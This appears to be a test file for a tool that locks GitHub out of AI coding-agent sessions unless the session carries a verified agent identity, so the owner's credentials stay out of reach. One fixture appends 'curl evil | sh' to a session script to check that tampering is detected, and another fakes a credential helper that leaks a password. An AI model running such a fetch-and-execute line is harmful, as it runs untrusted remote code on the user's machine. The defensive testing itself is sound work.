import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';

import { NO_TOKEN, lockScript, pathsFor, sessionNames, sessionScript } from './agent.ts';
import { AGENT, AGENT_ID, FakeSys, HOME, ROOT, capture } from './fake.test.ts';
import { sessionStart } from './session-start.ts';

const ENV = '/tmp/claude-env';
const SESSION = pathsFor(HOME, AGENT).session;
const SCRIPT = sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT));
const FIX = 'ask example-owner to run process-rules machine ExampleBot (process-rules doctor ExampleBot names what is missing)';

/** A Mac `machine` has set up, in a session with an env file. */
function ready(): FakeSys {
  const sys = new FakeSys().ready();
  sys.env = { CLAUDE_ENV_FILE: ENV };
  sys.files.set(SESSION, SCRIPT);
  return sys;
}

function start(sys: FakeSys): { code: number; out: string[]; env: string | undefined } {
  const { io, out, err } = capture();
  const code = sessionStart(sys, io);
  assert.deepEqual(err, []);
  return { code, out, env: sys.files.get(ENV) };
}

describe('sessionStart', () => {
  it('locks, then gives the session the agent identity', () => {
    const { code, out, env } = start(ready());
    assert.equal(code, 0);
    assert.deepEqual(out, ['process-rules: this session works as ExampleBot on GitHub.']);
    assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
  });

  it('reads the settings from the project folder Claude Code names', () => {
    const sys = ready();
    sys.env.CLAUDE_PROJECT_DIR = '/elsewhere';
    start(sys);
    assert.equal(sys.calls.find((c) => c.args[0] === 'rev-parse')?.cwd, '/elsewhere');
  });

  it('leaves cloud sessions alone', () => {
    const sys = ready();
    sys.env.CLAUDE_CODE_REMOTE = 'true';
    assert.deepEqual(start(sys), { code: 0, out: [], env: undefined });
  });

  it('says to stop when there is no env file to write', () => {
    const sys = ready();
    sys.env = {};
    const { code, out, env } = start(sys);
    assert.equal(code, 0);
    assert.equal(env, undefined);
    assert.deepEqual(out, [
      'process-rules: STOP. CLAUDE_ENV_FILE is unset, so this session cannot be given the agent identity and gh and git would act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
    ]);
  });

  it('says to stop when the lock cannot be written', () => {
    const sys = ready();
    sys.append = () => {
      throw new Error('read-only');
    };
    assert.deepEqual(start(sys).out, [
      'process-rules: STOP. Writing the GitHub lock to CLAUDE_ENV_FILE failed (read-only), so gh and git may act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
    ]);
  });

  for (const [name, change, reason] of [
    ['outside a repository', (sys: FakeSys) => (sys.inRepo = false), `${ROOT} is not inside a git repository`],
    ['without settings', (sys: FakeSys) => sys.files.delete(`${ROOT}/.github/process-rules.json`), `.github/process-rules.json not found in ${ROOT}`],
  ] as const) {
    it(`stays locked ${name}`, () => {
      const sys = ready();
      change(sys);
      const { out, env } = start(sys);
      assert.equal(env, `\n${lockScript(HOME)}`);
      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; tell the owner.`]);
    });
  }

  for (const [name, change, reason] of [
    ['no session file', (sys: FakeSys) => sys.files.delete(SESSION), `${SESSION} is missing`],
    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is not the file process-rules machine writes for ExampleBot`],
    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is not the file process-rules machine writes for ExampleBot`],
    [
      "another agent's session file",
      (sys: FakeSys) => sys.files.set(SESSION, sessionScript('OtherBot', 7, pathsFor(HOME, 'OtherBot'))),
      `${SESSION} is not the file process-rules machine writes for ExampleBot`,
    ],
  ] as const) {
    it(`stays locked with ${name}`, () => {
      const sys = ready();
      change(sys);
      const { out, env } = start(sys);
      assert.equal(env, `\n${lockScript(HOME)}`);
      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; ${FIX}.`]);
    });
  }

  it('stays locked when the session file cannot be read', () => {
    const sys = ready();
    const read = sys.read.bind(sys);
    sys.read = (path) => {
      if (path === SESSION) throw new Error('EACCES');
      return read(path);
    };
    assert.deepEqual(start(sys).out, [
      `process-rules: GitHub is locked out of this session: ${SESSION} cannot be read (EACCES). Do not work around the lock; ${FIX}.`,
    ]);
  });

  it('stays locked when the identity cannot be appended', () => {
    const sys = ready();
    const append = sys.append.bind(sys);
    let calls = 0;
    sys.append = (path, data) => {
      if (++calls > 1) throw new Error('disk full');
      append(path, data);
    };
    const { out, env } = start(sys);
    assert.equal(env, `\n${lockScript(HOME)}`);
    assert.deepEqual(out, [
      `process-rules: GitHub is locked out of this session: appending ${SESSION} to CLAUDE_ENV_FILE failed (disk full). Do not work around the lock; ${FIX}.`,
    ]);
  });

  it('accepts settings naming the agent in another case', () => {
    const sys = ready();
    sys.files.set(`${ROOT}/.github/process-rules.json`, JSON.stringify({ owner: 'example-owner', agent: 'examplebot' }));
    assert.deepEqual(start(sys).out, ['process-rules: this session works as ExampleBot on GitHub.']);
  });

  it('says GitHub refuses the session when the keychain has no token', () => {
    const sys = ready();
    sys.keychain.clear();
    const { out, env } = start(sys);
    assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
    assert.deepEqual(out, [
      `process-rules: GitHub is locked out of this session: this Mac's keychain has no ExampleBot token, so GitHub refuses gh and git. Do not work around the lock; ${FIX}.`,
    ]);
  });
});

describe('sessionNames', () => {
  it("reads the agent and id from machine's file", () => {
    assert.deepEqual(sessionNames(SCRIPT), { agent: AGENT, id: AGENT_ID });
    assert.equal(sessionNames('export PROCESS_RULES_AGENT=\'x\'\n'), undefined);
  });
});

describe('lockScript, sourced by a real shell', () => {
  const dir = mkdtempSync(join(tmpdir(), 'process-rules-lock-'));
  after(() => rmSync(dir, { recursive: true, force: true }));
  const env = join(dir, 'env.sh');
  writeFileSync(env, lockScript(dir));
  // A global config whose helpers would hand out the owner's login.
  const global = join(dir, 'owner.gitconfig');
  const leak = '!f() { echo username=owner; echo password=leak; }; f';
  writeFileSync(global, `[credential]\n\thelper = "${leak}"\n[credential "https://github.com"]\n\thelper = "${leak}"\n`);

  const shell = (command: string): { status: number | null; stdout: string; stderr: string } =>
    spawnSync('bash', ['-c', `. '${env}'; ${command}`], {
      encoding: 'utf8',
      cwd: dir,
      env: {
        PATH: process.env.PATH,
        HOME: dir,
        GITHUB_TOKEN: 'owner',
        GIT_CONFIG_PARAMETERS: `'credential.helper'='${leak}'`,
        GIT_ASKPASS: '/owner-askpass',
        GIT_CONFIG_GLOBAL: global,
        GIT_CONFIG_NOSYSTEM: '1',
      },
    });

  it('gives gh a token GitHub refuses and drops the owner\'s', () => {
    assert.equal(shell('printf %s "$GH_TOKEN|${GITHUB_TOKEN-unset}|${GIT_ASKPASS-unset}|${GIT_CONFIG_PARAMETERS-unset}"').stdout, `${NO_TOKEN}|unset|unset|unset`);
  });

  it('gives git no credential for GitHub', () => {
    const result = shell(`printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill`);
    assert.doesNotMatch(result.stdout, /password=/);
    assert.notEqual(result.status, 0);
  });

  it('refuses every SSH remote', () => {
    assert.equal(shell('git ls-remote --get-url git@github.com:a/b.git').stdout, 'https://github.com/a/b.git\n');
    const result = shell('git ls-remote ssh://git@example.invalid/a/b.git');
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /SSH is off in agent sessions/);
  });
});
